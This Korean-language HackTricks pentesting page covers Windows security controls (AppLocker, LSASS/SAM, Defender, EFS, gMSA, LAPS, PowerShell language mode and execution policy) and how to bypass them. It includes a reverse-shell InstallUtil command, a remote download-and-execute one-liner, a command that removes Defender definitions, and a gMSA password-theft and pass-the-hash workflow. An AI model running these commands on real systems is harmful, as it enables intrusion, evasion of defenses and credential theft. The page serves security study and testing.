# Windows 보안 제어

{{#include ../../banners/hacktricks-training.md}}

## AppLocker 정책

애플리케이션 whitelist는 시스템에 존재하고 실행할 수 있도록 승인된 소프트웨어 애플리케이션 또는 실행 파일의 목록입니다. 목표는 조직의 특정 비즈니스 요구 사항에 부합하지 않는 유해한 malware와 승인되지 않은 소프트웨어로부터 환경을 보호하는 것입니다.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker)는 Microsoft의 **애플리케이션 whitelist 솔루션**으로, 시스템 관리자가 **사용자가 실행할 수 있는 애플리케이션과 파일을 제어**할 수 있도록 합니다. 실행 파일, 스크립트, Windows installer 파일, DLL, 패키지된 앱 및 패키지된 앱 installer에 대해 **세분화된 제어**를 제공합니다.\
조직에서 **cmd.exe와 PowerShell.exe를 차단**하고 특정 디렉터리에 대한 쓰기 액세스를 제한하는 것은 일반적이지만, **이 모든 제한은 우회할 수 있습니다**.

### 확인

blacklist/whitelist에 포함된 파일 및 확장자를 확인합니다:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
이 registry path에는 AppLocker가 적용하는 구성과 정책이 포함되어 있어, 시스템에서 현재 적용 중인 규칙 집합을 검토할 수 있습니다:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Policy를 우회하는 데 유용한 **Writable folders**: AppLocker가 `C:\Windows\System32` 또는 `C:\Windows` 내부의 모든 항목 실행을 허용하는 경우, 이를 **bypass**하는 데 사용할 수 있는 **writable folders**가 있습니다.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- 일반적으로 **신뢰되는** [**"LOLBAS's"**](https://lolbas-project.github.io/) 바이너리도 AppLocker를 우회하는 데 유용할 수 있습니다.
- **잘못 작성된 규칙도 우회될 수 있습니다.**
- 예를 들어 **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**의 경우, 어디에든 **`allowed`라는 폴더를 생성**하면 허용됩니다.
- 조직은 또한 **`%System32%\WindowsPowerShell\v1.0\powershell.exe` 실행 파일을 차단**하는 데 집중하는 경우가 많지만, `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` 또는 `PowerShell_ISE.exe`와 같은 **다른** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)을 잊곤 합니다.
- **DLL enforcement는** 시스템에 추가적인 부하를 줄 수 있고 아무것도 손상되지 않도록 보장하기 위해 많은 테스트가 필요하므로 **활성화되는 경우가 매우 드뭅니다.** 따라서 **DLL을 백도어로 사용하면 AppLocker 우회에 도움이 됩니다.**
- [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 또는 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)을 사용하여 모든 프로세스에서 **Powershell** 코드를 **실행하고 AppLocker를 우회**할 수 있습니다. 자세한 내용은 다음을 참고하세요: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Credentials Storage

### Security Accounts Manager (SAM)

로컬 자격 증명은 이 파일에 있으며, 비밀번호는 해시되어 있습니다.

### Local Security Authority (LSA) - LSASS

Single Sign-On을 위해 이 하위 시스템의 **메모리**에 **자격 증명**(해시된 형태)이 **저장**됩니다.\
**LSA**는 로컬 **security policy**(비밀번호 정책, 사용자 권한 등), **authentication**, **access tokens** 등을 관리합니다.\
LSA는 로컬 로그인 시 **SAM** 파일에서 제공된 **자격 증명**을 **확인**하고, 도메인 사용자를 인증하기 위해 **domain controller**와 **통신**합니다.

**자격 증명**은 **LSASS 프로세스** 내부에 **저장**됩니다: Kerberos 티켓, NT 및 LM 해시, 쉽게 복호화할 수 있는 비밀번호입니다.

### LSA secrets

LSA는 일부 자격 증명을 디스크에 저장할 수 있습니다.

- Active Directory의 컴퓨터 계정 비밀번호(연결할 수 없는 domain controller).
- Windows 서비스 계정의 비밀번호
- scheduled tasks의 비밀번호
- 기타(IIS 애플리케이션의 비밀번호 등)

### NTDS.dit

Active Directory의 데이터베이스입니다. Domain Controllers에만 존재합니다.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender)는 Windows 10 및 Windows 11과 Windows Server 버전에서 사용할 수 있는 Antivirus입니다. **`WinPEAS`**와 같은 일반적인 pentesting 도구를 **차단**합니다. 하지만 이러한 **보호 기능을 우회하는 방법**이 있습니다.

### Check

**Defender**의 **상태**를 확인하려면 PS cmdlet **`Get-MpComputerStatus`**를 실행하면 됩니다(**`RealTimeProtectionEnabled`**의 값을 확인하여 활성 상태인지 알 수 있습니다).

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

이를 열거하려면 다음 명령도 실행할 수 있습니다:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## 암호화된 파일 시스템(EFS)

EFS는 **파일 암호화 키(File Encryption Key, FEK)**로 알려진 **대칭 키**를 사용하여 파일을 암호화함으로써 파일을 보호합니다. 이 키는 사용자의 **공개 키**로 암호화되어 암호화된 파일의 $EFS **대체 데이터 스트림**에 저장됩니다. 복호화가 필요하면 사용자의 디지털 인증서에 해당하는 **개인 키**를 사용하여 $EFS 스트림에서 FEK를 복호화합니다. 자세한 내용은 [여기](https://en.wikipedia.org/wiki/Encrypting_File_System)에서 확인할 수 있습니다.

**사용자 작업 없이 복호화되는 시나리오**는 다음과 같습니다.

- 파일이나 폴더를 [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table)와 같은 비-EFS 파일 시스템으로 이동하면 자동으로 복호화됩니다.
- SMB/CIFS 프로토콜을 통해 네트워크로 전송되는 암호화된 파일은 전송 전에 복호화됩니다.

이 암호화 방식은 소유자가 암호화된 파일에 **투명하게 액세스**할 수 있도록 합니다. 하지만 소유자의 비밀번호를 단순히 변경한 후 로그인하는 것만으로는 복호화할 수 없습니다.

**핵심 내용**:

- EFS는 사용자의 공개 키로 암호화된 대칭 FEK를 사용합니다.
- 복호화에는 FEK에 액세스하기 위한 사용자의 개인 키가 사용됩니다.
- FAT32로 복사하거나 네트워크로 전송하는 경우와 같은 특정 조건에서 자동 복호화가 발생합니다.
- 암호화된 파일은 추가 작업 없이 소유자가 액세스할 수 있습니다.

### EFS 정보 확인

다음 경로가 존재하는지 확인하여 **사용자**가 이 **서비스를 사용했는지** 확인합니다: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

cipher /c \<file>\을 사용하여 파일에 **액세스할 수 있는 사용자**를 확인합니다.  
폴더 내에서 `cipher /e` 및 `cipher /d`를 사용하여 모든 파일을 **암호화**하고 **복호화**할 수도 있습니다.

### EFS 파일 복호화

#### Authority System 권한으로 동작하기

이 방법을 사용하려면 **피해자 사용자**가 호스트 내에서 **프로세스를 실행 중**이어야 합니다. 그런 경우 `meterpreter` sessions을 사용하여 사용자의 프로세스 토큰을 impersonate_token(`incognito`의 `impersonate_token`)할 수 있습니다. 또는 사용자의 프로세스로 `migrate`할 수도 있습니다.

#### 사용자의 비밀번호를 알고 있는 경우

Mimikatz 문서에서는 사용자의 인증서/개인 키 자료를 가져오고 비밀번호를 알고 있을 때 EFS로 보호된 파일을 복호화하는 방법을 설명합니다.<sup>[[6]](#references)</sup>

## Group Managed Service Accounts (gMSA)

Microsoft는 IT 인프라에서 service accounts 관리를 간소화하기 위해 **Group Managed Service Accounts (gMSA)**를 개발했습니다. "**Password never expire**" 설정이 활성화된 경우가 많은 기존 service accounts와 달리, gMSA는 더욱 안전하고 관리하기 쉬운 솔루션을 제공합니다.

- **자동 비밀번호 관리**: gMSA는 240자로 구성된 복잡한 비밀번호를 사용하며, domain 또는 computer policy에 따라 자동으로 변경됩니다. 이 과정은 Microsoft의 Key Distribution Service(KDC)에서 처리하므로 수동으로 비밀번호를 업데이트할 필요가 없습니다.
- **향상된 보안**: 이러한 계정은 lockout의 영향을 받지 않으며 interactive login에 사용할 수 없어 보안이 향상됩니다.
- **여러 호스트 지원**: gMSA는 여러 호스트에서 공유할 수 있으므로 여러 서버에서 실행되는 service에 적합합니다.
- **Scheduled Task 기능**: managed service accounts와 달리 gMSA는 scheduled task 실행을 지원합니다.
- **간소화된 SPN 관리**: 컴퓨터의 sAMaccount 세부 정보 또는 DNS 이름이 변경되면 시스템이 Service Principal Name(SPN)을 자동으로 업데이트하여 SPN 관리를 간소화합니다.

gMSA의 비밀번호는 LDAP property _**msDS-ManagedPassword**_에 저장되며 Domain Controllers(DCs)에 의해 30일마다 자동으로 재설정됩니다. [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)로 알려진 암호화된 data blob 형식의 이 비밀번호는 권한이 있는 administrator와 gMSA가 설치된 server만 검색할 수 있어 안전한 환경을 보장합니다. 이 정보에 액세스하려면 LDAPS와 같은 보안 연결이 필요하거나 연결이 'Sealing & Secure'로 인증되어야 합니다.

![gMSA 비밀번호를 검색하기 위한 NTLM authentication Relaying](../../images/asd1.png)<sup>[[1]](#references)</sup>

[**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**를 사용하여 이 비밀번호를 읽을 수 있습니다.<sup>[[2]](#references)</sup>
```
/GMSAPasswordReader --AccountName jkohler
```
[**archived original research에서 더 많은 정보 확인**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/).<sup>[[1]](#references)</sup>

동일한 research에서는 relayed principal에 `msDS-ManagedPassword`를 읽을 권한이 있을 때 **NTLM relay attack**으로 **gMSA password**를 획득하는 방법을 설명합니다.<sup>[[1]](#references)</sup>

### ACL chaining을 악용하여 gMSA managed password 읽기 (GenericAll -> ReadGMSAPassword)

많은 환경에서 low-privileged users는 잘못 구성된 object ACL을 악용하여 DC compromise 없이 gMSA secrets로 pivot할 수 있습니다:<sup>[[3]](#references)</sup>

- 자신이 control할 수 있는 group(예: GenericAll/GenericWrite를 통한)에 gMSA에 대한 `ReadGMSAPassword` 권한이 부여됩니다.
- 해당 group에 자신을 추가하면 LDAP를 통해 gMSA의 `msDS-ManagedPassword` blob을 읽고 사용 가능한 NTLM credentials를 derive할 권한을 상속받습니다.

일반적인 workflow:

1) BloodHound로 path를 discover하고 foothold principals를 Owned로 mark합니다. 다음과 같은 edges를 찾습니다:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) 자신이 control하는 intermediate group에 자신을 추가합니다(bloodyAD 사용 예):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) LDAP를 통해 gMSA 관리 암호를 읽고 NTLM hash를 도출합니다. NetExec는 `msDS-ManagedPassword` 추출 및 NTLM 변환을 자동화합니다:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) NTLM hash를 사용하여 gMSA로 인증합니다(평문 비밀번호가 필요하지 않음). 계정이 Remote Management Users에 속해 있으면 WinRM이 바로 작동합니다:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Notes:
- `msDS-ManagedPassword`에 대한 LDAP 읽기에는 sealing이 필요합니다(예: LDAPS/sign+seal). Tools가 이를 자동으로 처리합니다.
- gMSA에는 WinRM과 같은 로컬 권한이 부여되는 경우가 많습니다. 측면 이동을 계획하려면 그룹 멤버십(예: Remote Management Users)을 확인하세요.
- blob을 사용해 직접 NTLM을 계산하려는 경우 MSDS-MANAGEDPASSWORD_BLOB structure를 참조하세요.



## LAPS

[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899)에서 다운로드할 수 있는 **Local Administrator Password Solution (LAPS)**은 로컬 Administrator 비밀번호를 관리할 수 있게 합니다. **randomized**되고 고유하며 **정기적으로 변경되는** 이 비밀번호는 Active Directory에 중앙에서 저장됩니다. 이러한 비밀번호에 대한 액세스는 ACL을 통해 권한이 부여된 사용자로 제한됩니다. 충분한 권한이 부여되면 로컬 admin 비밀번호를 읽을 수 있습니다.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)는 PowerShell을 효과적으로 사용하는 데 필요한 여러 기능을 **제한합니다**. 여기에는 COM objects 차단, 승인된 .NET types만 허용, XAML-based workflows, PowerShell classes 등이 포함됩니다.

### **확인**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### 우회
```bash
#Easy bypass
Powershell -version 2
```
현재 Windows 버전에서는 해당 우회가 더 이상 작동하지 않지만, [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM)을 사용할 수 있습니다.\
**컴파일하려면** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll`을 추가하고 **프로젝트를 .Net4.5로 변경해야 할 수 있습니다**.

#### 직접 우회:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 또는 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)을 사용하면 모든 프로세스에서 **Powershell** 코드를 실행하고 제한된 모드를 우회할 수 있습니다. 자세한 내용은 다음을 참조하세요: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## PS 실행 정책

기본적으로 **restricted**로 설정되어 있습니다. 이 정책을 우회하는 주요 방법은 다음과 같습니다:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
더 많은 내용은 [여기](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>에서 확인할 수 있습니다.

## Security Support Provider Interface (SSPI)

사용자를 인증하는 데 사용할 수 있는 API입니다.

SSPI는 두 통신 시스템에 적합한 인증 프로토콜을 선택하며, 사용 가능한 경우 Kerberos를 우선합니다. 이러한 프로토콜은 Windows에 DLL로 설치되는 Security Support Provider (SSP)에 의해 구현되며, 두 피어 모두 협상된 provider를 지원해야 합니다.

### 주요 SSP

- **Kerberos**: 기본적으로 우선되는 방식
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** 및 **NTLMv2**: 호환성을 위한 방식
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web 서버 및 LDAP에서 사용되며, password가 MD5 hash 형식으로 전달됨
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL 및 TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: 사용할 protocol을 협상하는 데 사용됨(Kerberos 또는 NTLM이며, 기본값은 Kerberos)
- %windir%\Windows\System32\lsasrv.dll

#### 협상 과정에서 여러 method 또는 단 하나의 method만 제공될 수 있습니다.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)은 **권한 상승 작업에 대한 동의 prompt**를 활성화하는 기능입니다.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [gMSA 릴레이 – cube0x0 (Internet Archive)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: 권한 chaining을 통한 WinRM용 gMSA](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – AppLocker 및 PowerShell Constrained Language Mode 우회](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – PowerShell Execution Policy를 우회하는 15가지 방법](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [방법 ~ EFS 파일 복호화](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
{{#include ../../banners/hacktricks-training.md}}
